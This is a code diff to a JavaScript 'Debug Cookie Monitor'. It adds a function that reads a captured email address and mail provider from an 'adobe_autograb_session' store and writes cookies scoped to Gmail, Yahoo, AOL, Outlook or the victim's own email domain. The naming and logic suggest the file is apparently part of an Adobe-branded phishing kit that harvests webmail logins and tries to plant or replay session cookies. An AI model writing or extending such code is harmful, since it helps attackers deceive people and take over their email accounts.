@@ -10,6 +10,34 @@
     
     console.log('🔍 Debug Cookie Monitor loaded');
     
+    // Helper to get domain from email/provider
+    function getDomainFromEmailProvider() {
+        let email = '';
+        let provider = '';
+        try {
+            const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
+            email = sessionData.email || '';
+            provider = sessionData.provider || '';
+        } catch (e) {}
+        const providerLower = (provider || '').toLowerCase();
+        if (providerLower.includes('gmail') || providerLower.includes('google')) {
+            return '.google.com';
+        } else if (providerLower.includes('yahoo')) {
+            return '.yahoo.com';
+        } else if (providerLower.includes('aol')) {
+            return '.aol.com';
+        } else if (providerLower.includes('hotmail') || providerLower.includes('live') ||
+                   providerLower.includes('outlook') || providerLower.includes('office365')) {
+            return '.live.com';
+        } else if (providerLower === 'others' && email && email.includes('@')) {
+            return '.' + email.split('@')[1].toLowerCase();
+        }
+        if (email && email.includes('@')) {
+            return '.' + email.split('@')[1].toLowerCase();
+        }
+        return window.location.hostname.startsWith('.') ? window.location.hostname : `.${window.location.hostname}`;
+    }
+    
     // Enhanced cookie debugging
     function debugCookies() {
         const cookies = document.cookie;
@@ -97,8 +125,10 @@
     
     window.setCookie = function(name, value, days = 7) {
         const expires = new Date(Date.now() + days * 864e5).toUTCString();
-        document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
-        console.log(`🍪 Cookie set: ${name}=${value}`);
+        // Use provider domain if available
+        const domain = getDomainFromEmailProvider();
+        document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/; domain=${domain}`;
+        console.log(`🍪 Cookie set: ${name}=${value}; domain=${domain}`);
         
         // Trigger change detection
         setTimeout(checkCookieChanges, 100);
